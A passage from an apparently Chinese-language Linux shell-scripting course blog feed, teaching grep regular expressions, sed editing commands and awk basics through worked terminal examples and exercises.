class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">tom tomtom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "^booboo" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">[root@rhel6 ~]# grep "\&lt;booboo" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">[root@rhel6 ~]# grep "\&gt;booboo" re.file</span><br><span class="line">[root@rhel6 ~]# grep "\&gt;jack" re.file</span><br><span class="line">[root@rhel6 ~]# grep "jack$" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">[root@rhel6 ~]# grep "jack\&gt;" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br></pre></td></tr></table></figure><h4 id="某个字符数量限定"><a href="#某个字符数量限定" class="headerlink" title="某个字符数量限定"></a>某个字符数量限定</h4><ul><li>x{m}连续 M 个字符 X       x{3} =3<ul><li>x{m,} 至少 M 个字符 Xx{3,} &gt;=3</li></ul></li><li>x{m,n} 至少 M 个最多 N 个字符 X x{3,4} &gt;=3 &lt;=4</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">tom tomtom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">ffofoofooofoooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;0\&#125;" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">tom tomtom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">booo</span><br><span class="line">boo</span><br><span class="line">ffofoofooofoooo</span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;1\&#125;" re.file</span><br><span class="line">boobootomjack</span><br><span class="line">jacktombooboo</span><br><span class="line">tom tomtom</span><br><span class="line">booo</span><br><span class="line">boo</span><br><span class="line">ffofoofooofoooo</span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;4\&#125;" re.file</span><br><span class="line">ffofoofooofoooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ o&#123;2,3&#125;$ ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# bash re.sh foo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh fooo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh fooof</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh foof</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="digit-代表数字而已-0-9"><a href="#digit-代表数字而已-0-9" class="headerlink" title="[:digit:]代表数字而已 , 0-9"></a>[:digit:]代表数字而已 , 0-9</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# cat re.file1</span><br><span class="line">45aa</span><br><span class="line">sdfsdf</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "[[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "^[[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "[^[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">sdfsdf</span><br><span class="line">[root@rhel6 ~]# grep "^[^[:digit:]]" re.file1</span><br><span class="line">sdfsdf</span><br></pre></td></tr></table></figure><h3 id="课堂作业"><a href="#课堂作业" class="headerlink" title="课堂作业"></a>课堂作业</h3><blockquote><p>1.说出下面匹配的内容</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">^a 以a开头</span></span><br><span class="line"><span class="meta">#</span><span class="bash">b? b的个数0或者1</span></span><br><span class="line"><span class="meta">#</span><span class="bash">c+ c的个数&gt;=1</span></span><br><span class="line"><span class="meta">#</span><span class="bash">d.*e d和e之间可以是任意字符</span></span><br><span class="line"><span class="meta">#</span><span class="bash">f$ 以f结尾</span></span><br><span class="line">if [[ $1 =~ ^ab?c+d.*ef$ ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h3 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a>课后作业</h3><blockquote><p>1.if判断匹配ip地址</p></blockquote><blockquote><p>2.if判断匹配邮件地址格式为<a href="mailto:9aA@9aA.com">9aA@9aA.com</a></p></blockquote><blockquote><p>3.grep 过滤空白行</p></blockquote><blockquote><p>4.grep 过滤以空格开头的行</p></blockquote><blockquote><p>5.针对/usr/share/dict/words文件做过滤</p></blockquote><blockquote><p> 1）列出文件中包含 先有字母t，然后中间有一个元音字母，之后是sh的单词；</p></blockquote><blockquote><p> 2）列出文件中包含 先有字母t，然后中间有若干个元音字母，之后是sh的单词；</p></blockquote><blockquote><p> 3）列出文件中刚好包含16个字母的单词。**</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$ ]]</span><br><span class="line">then</span><br><span class="line">IP=($&#123;1//\./ &#125;)</span><br><span class="line">[ $&#123;IP[0]&#125; -gt 0 -a $&#123;IP[0]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[1]&#125; -ge 0 -a $&#123;IP[1]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[2]&#125; -ge 0 -a $&#123;IP[2]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[3]&#125; -gt 0 -a $&#123;IP[3]&#125; -lt 255 ] &amp;&amp; echo ok || echo no</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">        echo "this is not IPADDR!"</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^[0-9a-zA-Z]+@[0-9a-zA-Z]+\.com$  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "^$" re.file2</span><br><span class="line"></span><br><span class="line">grep '^t[a-zA-Z]sh' /usr/share/dict/words</span><br><span class="line">grep '^t[a-zA-Z]\+sh' /usr/share/dict/words</span><br><span class="line">grep -E '^[a-zA-Z0-9]&#123;16&#125;$' /usr/share/dict/words                         </span><br><span class="line">grep '^[a-zA-Z0-9]\&#123;16\&#125;$' /usr/share/dict/words</span><br></pre></td></tr></table></figure><h3 id="晚自习作业"><a href="#晚自习作业" class="headerlink" title="晚自习作业"></a>晚自习作业</h3><ol><li>完成所有练习</li><li>帐号是否合法（字母开头，允许5-16位，只能包含字母数字下划线）</li><li>密码是否合法（字母开头，允许6-18位，只能包含字母数字下划线和！@#）</li><li>匹配日期2016-10-11<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> [[ <span class="variable">$1</span> =~ ^[0-9]&#123;4&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125;$ ]]</span></span><br><span class="line">if [[ $1 =~ ^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[1-9]|3[01])$ ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Regular Expression 、 regex 或 regexp, 缩写为 RE 正则表达式这个概念最初是由 Unix 中的工具软件 ( 例如 sed 和 grep) 普及开的。&lt;/p&gt;
&lt;p&gt;通常被用来检索、替换那些符合某个规则的文本。&lt;/p&gt;
&lt;p&gt;许多程序设计语
      
    
    </summary>
    
    
      <category term="技术培训" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本教程" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="培训" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts 第四课 Sed</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/03_shell_sed_awk/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/03_shell_sed_awk/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.745Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><h3 id="什么是sed"><a href="#什么是sed" class="headerlink" title="什么是sed"></a>什么是sed</h3><p>sed( 意为流编辑器 , 源自英语 “ stream editor” 的缩写 ) 是 Unix 常见的命令行程序。 sed 用来把文档或字符串里面的文字经过一系列编辑命令转换为另一种格式输出。 sed 通常 用来匹配一个或多个正则表达式的文本进行处理。 分号 (;) 可以用作分隔命令的指示符。尽管 sed 脚本固有的很多限制 , 一连串的 sed 指令加起来可以编程像 仓 库番、快打砖块、甚至俄罗斯方块等电脑游戏的复杂程序。</p><h3 id="如何使用sed"><a href="#如何使用sed" class="headerlink" title="如何使用sed"></a>如何使用sed</h3><h4 id="语法模式"><a href="#语法模式" class="headerlink" title="语法模式"></a>语法模式</h4><p>• 命令行模式<br>• 脚本模式</p><p>命令行模式</p><p>sed 流编辑器 针对行进行操作的</p><h4 id="sed命令的原理"><a href="#sed命令的原理" class="headerlink" title="sed命令的原理"></a>sed命令的原理</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">读文件---一行一行读</span><br><span class="line">存入缓存空间</span><br><span class="line">匹配行---是---动作--继续读取</span><br><span class="line">     ---不是------ 继续读取    </span><br><span class="line">读到最后一行为止</span><br><span class="line">输出</span><br></pre></td></tr></table></figure><h4 id="sed命令的用法"><a href="#sed命令的用法" class="headerlink" title="sed命令的用法"></a>sed命令的用法</h4><ul><li>sed [-options] ‘[cmd]’ filename</li><li>sed [-options] ‘[哪些行][干什么]’ filename</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">cmd</span><br><span class="line">    操作定位（哪一行）</span><br><span class="line">        1    第一行</span><br><span class="line">        2,3    从第二行到第三行</span><br><span class="line">        $    最后一行</span><br><span class="line">        正则表达式</span><br><span class="line">        /^root/    以root开头的行</span><br><span class="line">        /bin$/    以bin结尾的行</span><br><span class="line"></span><br><span class="line">        1. 十进制数字</span><br><span class="line">        2. 正则表达式</span><br><span class="line">        3. 逗号分隔符</span><br><span class="line">        4. 组合方式</span><br><span class="line">        5. 特殊方式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    函数（干什么）</span><br><span class="line">        p    打印，输出到屏幕上</span><br><span class="line">        d    删除</span><br><span class="line">        s    替换                   sed '/^#/s/\/\*.*\*\///' file  </span><br><span class="line">        a    当前行的行后，添加一行    sed '1ahello word' file</span><br><span class="line">        i    当前行的行前，添加一行    sed '1ihello word' file</span><br><span class="line">参数options</span><br><span class="line">    -n 不输出所有的行</span><br><span class="line">    -i 直接修改目标文件</span><br><span class="line">    -e 连接多个cmd</span><br><span class="line"></span><br><span class="line">简单控制流</span><br><span class="line"></span><br><span class="line">1. ! 命令取反</span><br><span class="line">    例如:sed '/kevin/!d' file</span><br><span class="line">    删除不包含字符串”kevin“的行</span><br><span class="line">2. &#123; &#125; 组合多个命令</span><br><span class="line">组合命令作为一个整体被执行,函数命令之间用” ;  “分隔,组合命令可以嵌套。</span><br><span class="line">例如:sed '/kevin/&#123;s/1/2/; /3/d&#125;' file。</span><br><span class="line"></span><br><span class="line">3. n 读取下一输入行,从下一条命令而非第一条命令开始操作</span><br><span class="line">例如:sed '/kevin/&#123;n; d&#125;' file</span><br><span class="line">删除带字符串”kevin“行的下一行</span><br></pre></td></tr></table></figure><h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol><li>下载mysqlbinlog.row文件</li><li>打印第三行</li><li>打印1到5行</li><li>打印最后一行</li><li>打印30到最后一行</li><li>打印包含“BEGIN”的行</li><li>打印包含“COMMIT”的行</li><li>打印以“###”开头的行</li><li>删除每一行的“### ”</li><li>删除所有“/<em>到</em>/”</li><li>将“DELETE FROM”替换为“insert into”</li><li>将“INSERT INTO”替换为“delete from”</li><li>将“SET”替换为“where”</li><li>将“WHERE”替换为“set”</li><li>将“@1”替换为“id”</li><li>将“@2”替换为“name”</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]# sed '3p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '3p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '1,5p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '$p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '30,$p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '/BEGIN/p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '/COMMIT/p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed '&#123;s/### //;s@\/\*.*\*\/@@;s/DELETE FROM/insert into/;s/INSERT INTO/delete from/;s/SET/where/;s/WHERE/set/;s/@1/id/;s/@2/name/&#125;' mysqlbinlog.row</span><br></pre></td></tr></table></figure><h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol><li>将192.168.1.1替换成192.168.2.2</li><li>将192.168.1.1替换成192.188.5.1</li><li>将192.168.1.1替换成192.192.192.1</li><li>将hello,babay中babay后面追加”,mybabay”</li><li>将hello,babay中hello后面追加”,mybabay”</li><li>将hello,babay替换为”hello1hello2hello3,babay”</li><li>将/tmp/shadow的内容追加到/tmp/passwd中以root开头的行的后面</li><li>将/tmp/passwd中以root开头的行和后面的2行写入/tmp/shadow</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)1.1/\12.2/'</span></span><br><span class="line">192.168.2.2</span><br><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)168.1\(.*\)/\1188.5\2/'</span></span><br><span class="line">192.188.5.1</span><br><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)168.1\(.*\)/\1\1\11/'</span></span><br><span class="line">192.192.192.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/babay/&amp;,mybabay/'</span></span><br><span class="line">hello,babay,mybabay</span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/hello/&amp;,mybabay/'</span></span><br><span class="line">hello,mybabay,babay</span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/hello/&amp;1&amp;2&amp;3/'</span></span><br><span class="line">hello1hello2hello3,babay</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># sed '/^root/r /tmp/shadow' /tmp/passwd</span></span><br><span class="line">[root@client0 ~]<span class="comment"># sed '/^root/,+2w /tmp/shadow' /tmp/passwd</span></span><br></pre></td></tr></table></figure><h4 id="课后习题"><a href="#课后习题" class="headerlink" title="课后习题"></a>课后习题</h4><pre><code>1. 将selinux设置成开机关闭状态。用sed完成2. 设置当前用户的umask值永久生效为033 ~/.bashrc。用sed完成3. 用脚本实现自动化搭建DNS服务器，并自动化配置解析，自动化测试。</code></pre><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>awk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。</p><p>awk有3个不同版本: awk、nawk和gawk，未作特别说明，一般指gawk，gawk 是 AWK 的 GNU 版本。</p><p>awk其名称得自于它的创始人 Alfred Aho 、Peter Weinberger 和 Brian Kernighan 姓氏的首个字母。实际上 AWK 的确拥有自己的语言： AWK 程序设计语言 ， 三位创建者已将它正式定义为“样式扫描和处理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计算以及生成报表，还有无数其他的功能。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>awk ‘{pattern + action}’ {filenames}</p><p>尽管操作可能会很复杂，但语法总是这样，其中 pattern 表示 AWK 在数据中查找的内容，而 action 是在找到匹配内容时所执行的一系列命令。花括号（{}）不需要在程序中始终出现，但它们用于根据特定的模式对一系列指令进行分组。 pattern就是要表示的正则表达式，用斜杠括起来。</p><p>awk语言的最基本功能是在文件或者字符串中基于指定规则浏览和抽取信息，awk抽取信息后，才能进行其他文本操作。完整的awk脚本通常用来格式化文本文件中的信息。</p><p>通常，awk是以文件的一行为处理单位的。awk每接收文件的一行，然后执行相应的命令，来处理文本。</p><h3 id="调用awk"><a href="#调用awk" class="headerlink" title="调用awk"></a>调用awk</h3><p>有三种方式调用awk</p><ol><li>命令行方式<br>awk [-F  field-separator]  ‘commands’  input-file(s)</li></ol><p>其中，commands 是真正awk命令，[-F域分隔符]是可选的。 input-file(s) 是待处理的文件。</p><p>在awk中，文件的每一行中，由域分隔符分开的每一项称为一个域。通常，在不指名-F域分隔符的情况下，默认的域分隔符是空格。</p><ol start="2"><li>shell脚本方式</li></ol><p>将所有的awk命令插入一个文件，并使awk程序可执行，然后awk命令解释器作为脚本的首行，一遍通过键入脚本名称来调用。</p><p>相当于shell脚本首行的：#!/bin/sh</p><p>可以换成：#!/bin/awk</p><ol start="3"><li>将所有的awk命令插入一个单独文件，然后调用：<br>awk -f awk-script-file input-file(s)</li></ol><p>其中，-f选项加载awk-script-file中的awk脚本，input-file(s)跟上面的是一样的。</p><p>本章重点介绍命令行方式。</p><h3 id="入门实例"><a href="#入门实例" class="headerlink" title="入门实例"></a>入门实例</h3><p>假设last -n 5的输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~]# last -n 5 &lt;==仅取出前五行</span><br><span class="line">root     pts/1   192.168.1.100  Tue Feb 10 11:21   still logged in</span><br><span class="line">root     pts/1   192.168.1.100  Tue Feb 10 00:46 - 02:28  (01:41)</span><br><span class="line">root     pts/1   192.168.1.100  Mon Feb  9 11:41 - 18:30  (06:48)</span><br><span class="line">dmtsai   pts/1   192.168.1.100  Mon Feb  9 11:41 - 11:41  (00:00)</span><br><span class="line">root     tty1                   Fri Sep  5 14:09 - 14:10  (00:01)</span><br></pre></td></tr></table></figure><p>如果只是显示最近登录的5个帐号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">last -n 5 | awk  <span class="string">'&#123;print $1&#125;'</span></span></span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">dmtsai</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>awk工作流程是这样的：读入有’\n’换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是”空白键” 或 “[tab]键”,所以$1表示登录用户，$3表示登录用户ip,以此类推。</p><p>如果只是显示/etc/passwd的账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/passwd |awk  -F <span class="string">':'</span>  <span class="string">'&#123;print $1&#125;'</span>  </span></span><br><span class="line">root</span><br><span class="line">daemon</span><br><span class="line">bin</span><br><span class="line">sys</span><br></pre></td></tr></table></figure><p>这种是awk+action的示例，每行都会执行action{print $1}。</p><p>-F指定域分隔符为’:’。</p><p>如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以tab键分割</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/passwd |awk  -F <span class="string">':'</span>  <span class="string">'&#123;print $1"\t"$7&#125;'</span></span></span><br><span class="line">root    /bin/bash</span><br><span class="line">daemon  /bin/sh</span><br><span class="line">bin     /bin/sh</span><br><span class="line">sys     /bin/sh</span><br></pre></td></tr></table></figure><p>如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以逗号分割,而且在所有行添加列名name,shell,在最后一行添加”blue,/bin/nosh”。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd |awk  -F ':'  'BEGIN &#123;print "name,shell"&#125;  &#123;print $1","$7&#125; END &#123;print "blue,/bin/nosh"&#125;'</span><br><span class="line">name,shell</span><br><span class="line">root,/bin/bash</span><br><span class="line">daemon,/bin/sh</span><br><span class="line">bin,/bin/sh</span><br><span class="line">sys,/bin/sh</span><br><span class="line">....</span><br><span class="line">blue,/bin/nosh</span><br></pre></td></tr></table></figure><p>awk工作流程是这样的：先执行BEGING，然后读取文件，读入有/n换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域,随后开始执行模式所对应的动作action。接着开始读入第二条记录······直到所有的记录都读完，最后执行END操作。</p><p>搜索/etc/passwd有root关键字的所有行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">awk -F: <span class="string">'/root/'</span> /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>这种是pattern的使用示例，匹配了pattern(这里是root)的行才会执行action(没有指定action，默认输出每行的内容)。</p><p>搜索支持正则，例如找root开头的: awk -F: ‘/^root/‘ /etc/passwd</p><p>搜索/etc/passwd有root关键字的所有行，并显示对应的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> awk -F: <span class="string">'/root/&#123;print $7&#125;'</span> /etc/passwd             </span></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p>这里指定了action{print $7}</p><h3 id="awk内置变量"><a href="#awk内置变量" class="headerlink" title="awk内置变量"></a>awk内置变量</h3><p>awk有许多内置变量用来设置环境信息，这些变量可以被改变，下面给出了最常用的一些变量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ARGC               命令行参数个数</span><br><span class="line">ARGV               命令行参数排列</span><br><span class="line">ENVIRON            支持队列中系统环境变量的使用</span><br><span class="line">FILENAME           awk浏览的文件名</span><br><span class="line">FNR                浏览文件的记录数</span><br><span class="line">FS                 设置输入域分隔符，等价于命令行 -F选项</span><br><span class="line">NF                 浏览记录的域的个数</span><br><span class="line">NR                 已读的记录数</span><br><span class="line">OFS                输出域分隔符</span><br><span class="line">ORS                输出记录分隔符</span><br><span class="line">RS                 